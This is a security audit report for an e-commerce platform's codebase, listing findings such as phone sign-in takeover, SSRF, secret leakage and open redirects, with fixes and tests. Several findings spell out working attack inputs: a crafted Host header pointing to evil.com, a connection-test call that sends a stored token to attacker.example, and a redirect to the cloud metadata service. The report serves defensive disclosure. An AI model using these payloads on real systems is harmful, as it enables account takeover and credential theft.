# Security audit, 28 September 2026

Review of everything merged to `main` since 25 September 2026 (base `f0e3df3`, PR #144, to
`a56f107`, PR #216: about 920 files, 146k lines), fixed in PR `fix/security-audit-2026-09`.

## Scope and method

Areas: returns/RTO, sender email, S3, RapidShyp, Shopify import and Dev Dashboard connect,
imported media processing, onboarding / invites / waitlist, image pipeline, EMI app, Growth
links, the theme editor (dynamic sources, custom sections, Custom HTML and its sanitiser, link
and image pickers), Cashfree, Hindi i18n, Settings → Policies / Checkout / Taxes & GST, customer
privacy (consent, export, erasure, audit trail, marketing consent), shopper login (Google,
Apple, Facebook, Truecaller, magic link, passkeys, remember-device, the platform login domain
hand-off), order contact and address edits, tracking numbers, manual payments, Payments by
method, admin layout / image reorder / media picker, and the deploy files.

Checked for each: store isolation (RLS, ids loaded under the caller's store), IDOR, secrets at
rest and in responses/logs/errors/exports, webhook signatures and replay, auth hand-off and
account linking, CSRF, rate limits, upload limits and types, SSRF, open redirects, XSS, PII in
logs and analytics, and what anonymisation keeps.

Eight parallel read-only reviews, then every finding re-read against the code before fixing.
Tests: every fix has a regression test. The DB-backed suites ran against a local Postgres 16 +
Redis (the repo targets Postgres 17); see "Verification" at the end.

Severity: **Critical** = account takeover or money without a precondition an outsider cannot
meet; **High** = the same with a realistic precondition, or secret theft; **Medium** =
integrity/privacy harm needing staff access or unusual conditions; **Low** = defence in depth.

## Summary

| ID | Severity | Finding | Status |
|---|---|---|---|
| S-01 | Critical | Guest checkout puts an unproven phone on an existing customer; phone sign-in then logs in as them | Fixed (migration 0077) |
| S-02 | High | Crafted `Host` header makes the store email a sign-in link pointing at the attacker's site | Fixed |
| S-03 | High | Sign-in codes: parallel guesses bypass the 5-try limit; a resend resets it; limiter keys not normalised | Fixed |
| S-04 | High | Razorpay payment without our Razorpay order (or for less money) could mark an order paid | Fixed |
| S-05 | High | Stored courier/storage secret sent to any host by changing only `baseUrl`/`accountId` (settings.read was enough to test) | Fixed |
| S-06 | High | Shopify import re-hosting: full-read SSRF (metadata service via redirect, `file://`), stored as media | Fixed |
| S-07 | High | Presigned uploads did not sign `content-type`: HTML/SVG stored and served from the media domain | Fixed |
| S-08 | Medium | "Connect Google" start link, forwarded to a victim, linked the victim's identity to the attacker's account | Fixed |
| S-09 | Medium | Open redirect after sign-in via tab/CR in `return_to` (`/%09/evil.com`) | Fixed |
| S-10 | Medium | Magic-link token sent to GA4 / GTM / Meta pixel in the page URL | Fixed |
| S-11 | Medium | Marketing sent to a contact other than the consenting customer; COD automation steps bypassed consent | Fixed |
| S-12 | Medium | Store credit on a return had no upper bound | Fixed |
| S-13 | Medium | Formatted PIN (`110-001`) bypassed COD blocked PIN codes and zone excludes | Fixed |
| S-14 | Medium | Data requests: another store's customer id could be linked; one customer's request answered by erasing another | Fixed |
| S-15 | Medium | Erasure left PII in contact-change notes, old address snapshots, `notification.to`, guest carts | Fixed |
| S-16 | Medium | Local upload route: no content permission, any key in the store, whole body buffered | Fixed |
| S-17 | Medium | R2 `accountId` unvalidated (it is the endpoint host); platform default keys reusable against another bucket | Fixed |
| S-18 | Medium | Invite-only signup bypassed through any staff membership; invite not claimed atomically | Fixed |
| S-19 | Medium | CSV formula injection in admin report/customer exports | Fixed |
| S-20 | Low | GlitchTip scrubber missed camelCase/prefixed secret keys, OTPs, UPI ids | Fixed |
| S-21 | Low | `store.current` returned every encrypted connector blob to settings.read | Fixed |
| S-22 | Low | Theme: CSS declaration injection (`backgroundColor`, `align`), free `id`/class, Custom HTML `class`, unsafe section hrefs, binding fallback not sanitised | Fixed |
| S-23 | Low | Failed image processing left the original public; SVG-as-PNG decoded | Fixed |
| S-24 | Low | Tracking URL accepted `javascript:`/`data:` | Fixed |
| S-25 | Low | Order contact edit rewrote the customer's address book with only orders.write | Fixed |
| S-26 | Low | Waitlist entry keyed on a typed email (overwrite someone else's) | Fixed |
| S-27 | Low | Truecaller profile fetch followed redirects, no timeout or size cap | Fixed |
| S-28 | Low | Deploy: nested `.env*` not in `.dockerignore`; release deploy job held `packages: write`; `init.sh` interpolated the password into SQL | Fixed |
| S-29 | Low | Razorpay dedupe key from the unsigned event-id header | Fixed |
| S-30..S-38 | Low | See "Smaller fixes" | Fixed |
| D-01..D-12 | - | Owner decisions | Open |

## Fixed

### S-01 Critical: phone sign-in into another shopper's account

- **Where**: `packages/core/src/order/place-order.ts` (guest checkout upsert on `(store, email)`
  wrote `phone`/`phone_index`), `accounts/profile.ts`, `accounts/otp.ts` `verifyPhoneLoginCode`
  and `shopper-login/identities.ts` (Truecaller) matched the newest customer with that
  `phone_index`.
- **Exploit**: on a store with SMS/WhatsApp/Truecaller sign-in and guest checkout, check out as a
  guest with `victim@x.in` and your own mobile (a COD order you never accept). The victim's row
  now carries your phone. Request a code to your phone and you are signed in as the victim:
  orders, addresses, export/deletion requests.
- **Fix**: `customer.phone_verified_at` (migration `0077_customer_phone_verified`). Set only by a
  phone sign-in code or Truecaller. Phone sign-in and Truecaller linking only match a row whose
  phone is proven or that has no email (`accounts/phone-proof.ts`). Checkout keeps a proven
  phone instead of overwriting it; profile, staff edits and imports clear the proof when they
  change the number; erasure clears it.
- **Existing data**: no row is proven after the migration, so customers who have an email and
  used phone sign-in before get a new phone-only account on their next phone sign-in until they
  prove the phone. The feature merged on 27 September and has not been deployed.
- **Tests**: `accounts/phone-proof.test.ts` (pure); `accounts/otp.test.ts` "never signs in as a
  customer whose phone was only typed at checkout" (DB).

### S-02 High: Host header poisons emailed sign-in links

- **Where**: `apps/storefront/src/lib/shopper-login.ts` `requestOrigin` built
  `new URL(proto + '://' + host)`; `store-resolver.ts` `hostnameFromHeader` took everything
  before the first `:`.
- **Exploit**: `Host: store.in:1@evil.com` resolves to the store (`store.in`), while
  `new URL('https://store.in:1@evil.com').origin` is `https://evil.com`. Calling the magic-link
  action with the victim's email makes the store send the victim
  `https://evil.com/account/login/link?token=…`. Also `seo.ts` trusted `x-forwarded-host` for
  canonical URLs, JSON-LD, sitemap and robots (cache poisoning).
- **Fix**: `parseHostHeader` accepts only `host[:port]`; the proxy refuses anything else, and
  `originFromHost` builds every origin from the validated parts. `seo.ts` no longer reads
  `x-forwarded-host`.
- **Tests**: `apps/storefront/src/lib/store-resolver.test.ts`.

### S-03 High: sign-in code brute force

- **Where**: `packages/core/src/accounts/auth.ts` and `otp.ts` (read `attempts`, write
  `attempts + 1` at READ COMMITTED; resend upserted `attempts: 0`); limiter keys in
  `apps/storefront/src/lib/{account,privacy,login}-actions.ts` used the raw input and were not
  per store.
- **Exploit**: fire many wrong guesses in parallel (they all read 0), resend every 30 s for five
  fresh guesses, and vary spacing/case (`' a@b.in'`, `'+91 98765 43210'`, `'09876543210'`) to
  get a new limiter bucket each time. One store's limit also locked the shopper out of others.
- **Fix**: verify locks the code row (`FOR UPDATE`); wrong guesses carry over to a resent code
  for an hour (`attemptsCarriedOver`), and a locked destination cannot get a new code until then;
  `otpLimiterId(storeId, kind, raw)` keys every limiter on the normalised address, per store.
- **Tests**: `accounts/code-limits.test.ts` (pure); `accounts/accounts.test.ts` "does not hand
  out fresh guesses with a resent code", `otp.test.ts` lockout case (DB).

### S-04 High: Razorpay payments that are not ours, or too small

- **Where**: `packages/payments-razorpay/src/razorpay.ts` (`providerRef: pay.order_id ?? ''`,
  `idempotencyKey` from payment notes), `packages/core/src/payments/confirm.ts` (falls back to the
  idempotency key), `payments/webhook.ts` (never compared the amount).
- **Exploit**: open Razorpay Checkout with the store's public key id, no `order_id`, ₹1, and
  `notes.idempotencyKey = "<orderId>:1"` (the order id is in the shopper's own pay/thank-you
  link). The genuine signed `payment.captured` finds the ₹5,000 attempt by the notes key and
  marks it captured. (Depends on Razorpay copying notes and auto-capturing; not tried live.)
- **Fix**: Razorpay `payment.*` events without an `order_id` are ignored (QR payments still come
  through `qr_code.credited`); any gateway event reporting less than the attempt's amount is
  stored with `error = amount mismatch …` and not applied (`gatewayPaidTooLittle`; more than
  asked is allowed for gateway fees).
- **Tests**: `payments-razorpay/test/razorpay.test.ts` (order-less payment ignored);
  `core/src/payments/amount-check.test.ts` (pure); `payments/webhook.test.ts` "keeps an order
  unpaid when the gateway reports less than the attempt" (DB).

### S-05 High: stored secrets sent to a new address

- **Where**: masked-secret merge in `packages/api/src/services/{provider-settings,shipping.service,media.service}.ts`;
  courier `baseUrl` checks (`^https://` only) in `shipping-{delhivery,shiprocket,rapidshyp}`;
  `store.test{Delhivery,Shiprocket,Rapidshyp,Decentro,Storage}Connection` needed only
  settings.read.
- **Exploit**: a role with settings.read calls `testDelhiveryConnection({ apiToken: '••••1234',
  baseUrl: 'https://attacker.example', … })`; the server swaps in the real token and sends
  `Authorization: Token <real>` to the attacker (Shiprocket sends the email and password, RapidShyp
  its key). Saving the same with settings.manage leaked it on every later call.
- **Fix**: `mergeMaskedSecrets` (`core/src/settings/secrets.ts`) refuses to keep a stored secret
  when a destination field (`baseUrl`, `endpoint`, `host`, `accountId`, `bucket`) changes; all
  three merge sites use it. Courier base URLs must be https on the courier's own domain
  (`courierBaseUrlProblem`). Test-connection procedures need settings.manage.
- **Tests**: `core/src/settings/secrets.test.ts`, `shipping/test/base-url.test.ts`, base-URL cases
  in each courier's test file.

### S-06 High: SSRF through imported media

- **Where**: `packages/plugin-shopify-import/src/media.ts` (plain `fetch` of CSV `Image Src` and
  `<img src>` in body HTML; type from the URL extension; size cap only via `content-length`).
- **Exploit**: `Image Src = https://attacker/x.mp4` answering `302 → http://169.254.169.254/…`;
  the metadata text is stored as `video/mp4` and served publicly. `file://` works on Bun.
  Chunked bodies were read whole.
- **Fix**: new `@commerce/core/safe-fetch`: https (http opt-in) only, every resolved address
  checked (private, loopback, link-local/metadata, CGNAT, multicast, reserved, IPv6 forms incl.
  `::ffff:` mapped and NAT64), redirects followed by hand and re-checked (3 hops), timeout,
  streamed byte cap. Media type sniffed from magic bytes when the response type is not a media
  type. DNS rebinding between check and connect is an accepted residual risk (documented).
- **Tests**: `core/src/net/safe-fetch.test.ts`, `plugin-shopify-import/test/media.test.ts`.

### S-07 High: content type not signed on presigned uploads

- **Where**: `packages/storage-s3-compat/src/client.ts` (`X-Amz-SignedHeaders=content-length;host`),
  `core/src/media/service.ts` `confirmUpload` ignored the stored type.
- **Exploit**: a content writer presigns `image/png`, PUTs HTML with `Content-Type: text/html`;
  the bucket serves a page on the media domain (shared across tenants on the platform bucket).
- **Fix**: `content-type` is a signed header; `confirmUpload` deletes the object and refuses when
  the stored type differs from the announced one.
- **Tests**: `storage-s3-compat/test/client.test.ts`; `media/service.test.ts` "refuses and deletes
  an object stored with another type" (DB).

### S-08 Medium: account-linking CSRF through a forwarded Connect link

- **Where**: `apps/storefront/src/app/-a/oauth/[provider]/callback/route.ts` linked
  `start.c` (the signed-in customer) on the platform login domain, before the store-domain
  browser check.
- **Exploit**: the attacker opens `/account/login/social/google?connect=1`, copies the
  `accounts…/oauth/google/start?req=…` URL and sends it to a victim; the victim picks their
  Google account and it is linked to the attacker's customer (the hand-off then fails, but the
  link stays). Later "Continue with Google" puts the victim in the attacker's account.
- **Fix**: the callback only checks for a conflict (`planConnect`) and mints a `connect`
  hand-off; the link is written in `/account/login/complete` after the browser check, only for
  the customer signed in on the store's domain.
- **Tests**: `shopper-login/tokens.test.ts` `connectDecision` (pure);
  `shopper-login.test.ts` "carries a connect request without linking anything" (DB).

### S-09 Medium: open redirect after sign-in

- **Where**: `core/src/shopper-login/tokens.ts` `safeNextPath` (blocked only CR/LF),
  `apps/storefront/src/lib/customer-session.ts` `safeReturnTo` (only LF).
- **Exploit**: `/account/login?return_to=/%09/evil.com`; browsers drop the tab and follow
  `//evil.com` (a signed-in visitor is redirected at once).
- **Fix**: one sanitiser: no control characters or backslashes, and the path must resolve to the
  same origin. `safeReturnTo` calls it.
- **Tests**: `shopper-login/tokens.test.ts`.

### S-10 Medium: sign-in token in analytics

- **Where**: `apps/storefront/src/app/-s/[storeId]/account/login/link/page.tsx` keeps the live
  token in `?token=`; GA4 `page_location` and the Meta pixel send the full URL.
- **Exploit**: anyone with access to the merchant's GA or Events Manager redeems the token within
  15 minutes, before the shopper taps.
- **Fix**: third-party tags never load under `/account/login` (`lib/tracking-paths.ts`); the page
  also removes the token from the address bar on mount.
- **Tests**: `apps/storefront/src/lib/tracking-paths.test.ts`.

### S-11 Medium: marketing to someone who never consented

- **Where**: `core/src/marketing/automations.ts` (sent to `run.email`/`run.phone`, the typed cart
  or order contact, under the customer's consent; every WhatsApp step of a `cod_order_placed`
  automation counted as transactional), `notifications/deliver.ts` manual "Send recovery".
- **Exploit**: set a cart's email to a subscriber's and the phone to a stranger's; the stranger
  gets the abandoned-checkout WhatsApp. A COD automation with "wait 3 days → promo" skipped
  consent for every COD buyer.
- **Fix**: marketing steps send only to the customer's own stored email or phone
  (`recipientIsCustomers`, else `recipient_mismatch`); only the first step of a COD automation,
  when it is WhatsApp, is transactional; manual recovery is refused on a channel where a known
  customer for that contact has not consented.
- **Tests**: `marketing/recipient.test.ts` (pure); "recipient" cases in
  `marketing/automations.test.ts` (DB).

### S-12 Medium: unbounded store credit

- **Where**: `core/src/returns/resolve.ts` `storeCreditReturn`.
- **Exploit**: a role with orders.refund (but no gift-card permission) resolves a ₹100 return
  with ₹2,00,000 credit; the gift card is emailed to the order email, which the same role can
  change.
- **Fix**: capped at the returned lines' value after the order discount, or for an RTO at what
  was paid and not refunded (`storeCreditCapPaise`).
- **Tests**: `returns/store-credit-cap.test.ts` (pure); `returns.test.ts` over-cap case (DB).

### S-13 Medium: formatted PIN codes bypass COD and zone rules

- **Where**: `core/src/checkout/settings.ts` `codDecision` compared the raw PIN;
  `placeOrder` passed it through to zones and the stored address.
- **Fix**: `placeOrder` normalises the PIN (`checkoutPincode`) before any rule runs and refuses a
  PIN that is not six digits; `codDecision` normalises too.
- **Tests**: `checkout/settings.test.ts`.

### S-14 Medium: data request ids not checked

- **Where**: `core/src/privacy/requests.ts` `updateDataRequest` (`customerId` written unchecked;
  the FK ignores RLS), `api/src/routers/customer-privacy.ts` `export`/`anonymise`
  (`dataRequestId` unchecked).
- **Exploit**: link store B's customer to store A's request: the append-only audit row pins it
  and B can never delete that customer. Or erase customer X "for" Y's deletion request: Y's
  request closes as completed with Y's data untouched.
- **Fix**: linked customers are loaded under the store first; `requestAnsweredFor` requires the
  request to be this store's and for the same customer (or none yet).
- **Tests**: `privacy/request-scope.test.ts` (pure); `privacy.test.ts` ownership case (DB).

### S-15 Medium: erasure gaps

- **Where**: `core/src/privacy/anonymise.ts`; `order/contact.ts`.
- **What stayed**: contact-change notes quoting old/new email, phone and address; superseded
  address snapshots after a contact edit; `notification.to`; guest carts with the email.
- **Fix**: erasure blanks notes written by contact edits (`CONTACT_NOTE_PATTERN`), message
  recipients and carts by email; a contact edit deletes the orphaned snapshot (the note keeps
  what it said until erasure).
- **Tests**: `privacy.test.ts` "erases contact-change notes, message recipients and guest carts
  too"; `api/test/orders-contact-payments.test.ts` updated (DB).

### S-16 Medium: local upload route

- **Where**: `apps/admin/src/app/api/uploads/route.ts` (the default when no storage connection
  is installed).
- **Exploit**: any member overwrote any key under their store (an invoice PDF, an import CSV
  between preview and run, a processed master) and a multi-GB PUT was read into memory.
- **Fix**: `authorizeLocalUpload`: content.write, only a pending media row's key, same type; the
  body is streamed with the type's cap (`readCappedBody`).
- **Tests**: `apps/admin/src/lib/read-capped-body.test.ts`; `media/service.test.ts`
  `authorizeLocalUpload` (DB).

### S-17 Medium: R2 endpoint host from `accountId`

- **Where**: `packages/storage-r2/src/r2.ts` (`https://${accountId}.r2.cloudflarestorage.com`).
- **Exploit**: `accountId = 'evil.example#'` or `'10.0.0.5:8443/x?'` moves the signed requests to
  another host (the "Could not reach" message is a scan oracle); with the platform's env default
  keys, a tenant could point them at another bucket while keeping the masked secret.
- **Fix**: `accountId` must be 32 hex characters; `mergeMaskedSecrets` (S-05) refuses to keep a
  secret when `accountId` or `bucket` changes.
- **Tests**: `storage-r2/test/r2.test.ts`, `settings/secrets.test.ts`.

### S-18 Medium: invite-only signup

- **Where**: `api/src/routers/onboarding.ts`, `apps/admin/src/app/onboarding/page.tsx` counted any
  organisation membership as owning a store; the invite was marked used after `createStore`
  without `used_at is null`.
- **Fix**: `userOwnsAStore` counts only owner memberships; the invite is claimed atomically
  before the store is created and released if creation fails.
- **Tests**: `onboarding/owner-role.test.ts` (pure); `signup-gate.test.ts` double claim (DB).

### S-19 Medium: CSV formula injection

- **Where**: `apps/admin/src/lib/csv.ts` (reports CSV: UTM source/campaign, city, product and
  vendor names; customers export).
- **Fix**: text cells starting with `= + - @ tab CR` get an apostrophe; numbers are untouched.
- **Tests**: `apps/admin/src/lib/csv.test.ts`.

### S-20 to S-29 Low

- **S-20** `packages/observability/src/scrub-pii.ts`: keys are matched with case, `-` and `_`
  removed and by credential word (`secretAccessKey`, `X-Api-Key`, `privateKey`, `otp`); UPI ids
  redacted. Test: `observability/test/scrub-pii.test.ts`.
- **S-21** `store.current` drops payments, notifications, shipping, storage, login providers and
  app settings (`presentStore`). Test: `api/test/input-guards.test.ts`.
- **S-22** Theme: `backgroundColor` through `safeColour` (hex, colour functions, plain keywords);
  text align, weight and token lookups allow-listed (`Object.hasOwn`); `anchorId` and
  `colorScheme` pattern-checked; Custom HTML drops `class`; twelve sections render hrefs through
  `safeHref`, which (with `safeUrl` and `normalisePastedUrl`) refuses `/\host` and control
  characters; a bound Custom HTML fallback is sanitised on save; sweep reasons corrected. Tests
  in `packages/blocks/test/*`, `core/src/theme/custom-sections.test.ts`,
  `core/src/dynamic-sources/format.test.ts`, `apps/admin/src/lib/customize-links.test.ts`.
- **S-23** `apps/worker/src/media-process.ts`: a final failure deletes the unprocessed object;
  `processImage` refuses bytes that are not jpeg/png/webp/gif/heif/avif. Test:
  `media/pipeline.test.ts`.
- **S-24** `orders.fulfil` `trackingUrl` must be http(s). Test: `api/test/input-guards.test.ts`.
- **S-25** `orders.updateContact` with `alsoUpdateCustomer` needs customers.write. Test:
  `api/test/permissions.test.ts` (DB).
- **S-26** `onboarding.joinWaitlist` uses the signed-in email.
- **S-27** Truecaller profile fetch: `redirect: 'error'`, 5 s timeout, 64 KB cap. Test:
  `shopper-login/tokens.test.ts`.
- **S-28** `.dockerignore` excludes `**/.env*` (keeps `.env.example`); `release.yml` grants
  `packages: write` to the build job only; `deploy/postgres/init.sh` passes the password and
  database name as psql variables.
- **S-29** Razorpay dedupe key is `event:entityId` from the signed body. Test:
  `razorpay.test.ts`.

### Smaller fixes (S-30 to S-38)

See the PR description for the list; each has a test beside the change.

## Owner decisions

| ID | Decision needed | Why it is not a code fix |
|---|---|---|
| D-01 | Trust `cf-connecting-ip` only behind Cloudflare. `clientIp` (`core/src/rate-limit/ip.ts`) believes it unconditionally; the Dokploy/Traefik deploy has no Cloudflare-only origin lock, so every per-IP limit can be bypassed with a random header. Options: firewall the origin to Cloudflare ranges, or an env flag plus Traefik `forwardedHeaders.trustedIPs`. | Depends on the production edge. |
| D-02 | Pin third-party actions in `release.yml` (`docker/setup-buildx-action@v3`, `login-action@v3`, `build-push-action@v6`) to commit SHAs. | SHAs must be looked up and kept current; not possible from the build sandbox. |
| D-03 | Truecaller phishing: the nonce is bound to the polling browser, not the consenting device, so a page can show a victim the deep link for the attacker's nonce. Offer Truecaller only on the store's own origin, and consider an OTP the first time a Truecaller number links an existing customer. | Product trade-off; verify against Truecaller's current docs. |
| D-04 | Passkey challenges are stateless (HMAC cookie, 5 min) and `requireUserVerification` is off. Store a single-use challenge id and decide on user verification. | Needs a ticket kind and a UX call on PIN-less keys. |
| D-05 | Plan invites (`plan-invites.ts`) are not revoked on refund or cancel. | Refund policy for plans. |
| D-06 | `stateCode` at checkout is trusted from the client (zones, IGST vs CGST/SGST). Check it against the PIN directory once that data is shipped. | Pincode directory data is still pending. |
| D-07 | Gift-card lines count toward the minimum order and COD limit. | Pricing rule. |
| D-08 | RapidShyp: any code starting `RTO` opens an RTO task as `received` at once; confirm the code list with RapidShyp. | Needs their status table. |
| D-09 | Newsletter signups have no double opt-in (consent recorded for any typed email). | DPDP consent design. |
| D-10 | Erasure still keeps return photos and their files, `shipment.tracking`/webhook payloads (may carry consignee name/phone), `customer_otp` rows keyed by destination hash, and back-in-stock signups (known). | Needs a decision on what the courier/returns records must keep. |
| D-11 | Payment webhook routes answer `unknown store` / `provider not enabled` / `bad signature` separately (an existence oracle) and a non-UUID store id is a 500. | Low value; tie to D-01. |
| D-12 | Compose: the `internal` network blocks the worker's egress (payments, couriers, SES) and backups; `SHOPPER_*` env is missing from `x-app-env`. Functional, found during the review. | Infra change before the first deploy. |

## Reviewed and fine

- **Isolation**: every new table is under `apply_store_rls()` (0075, 0076); orders, customers
  addresses, returns, shipments, policies, checkout, taxes, EMI, media, themes/pages and custom
  sections load ids under RLS; `collectPayment` returns NOT_FOUND for another store's order.
- **Webhooks**: Razorpay and Cashfree HMAC over the raw body with `timingSafeEqual`; Cashfree
  15-minute window in s or ms; Decentro constant-time token; Delhivery/Shiprocket fail closed
  and re-fetch tracking instead of trusting the payload; `payment_event` dedupe per store.
- **Hand-off**: signed, 2-minute, single-use (`DELETE … RETURNING`), bound to store, exact return
  URL on an active domain and the starting browser; OAuth state and PKCE; Apple `"true"`;
  Facebook email never trusted; unverified emails confirmed by code.
- **Secrets**: connector and login-app secrets `secret: true`, AES-GCM, masked; Shopify token
  hint only; SES from env; sender domain claimed per store.
- **XSS**: Custom HTML sanitiser (javascript/data/vbscript, entity and whitespace tricks, iframe
  host tricks, forced sandbox/allow), JSON-LD escapes `<`, rich text and policy pages through
  `packages/richtext`, preview bridge checks origin and HMAC, React 19 blocks `javascript:`.
- **Uploads**: SVG not accepted, keys built from sanitised names, local serving with `nosniff`,
  CSP sandbox and SVG as download; return photos only from the store's own prefix.
- **Other**: Hindi locale cookie allow-listed; `/api/beacon` checks consent server-side and
  stores no PII; OTP/magic-link logging gated on non-production; images run as non-root, no
  secret build args, no host ports on Postgres/Dragonfly.

## Not verified here

- Razorpay copying Checkout notes onto an order-less payment (S-04 fixed regardless).
- Whether sharp's `limitInputPixels` covers every frame of an animated GIF.
- Whether a Host header containing `@` reaches Node through Cloudflare/Traefik (S-02 fixed
  regardless).

## Verification

See the PR description for the commands and results.
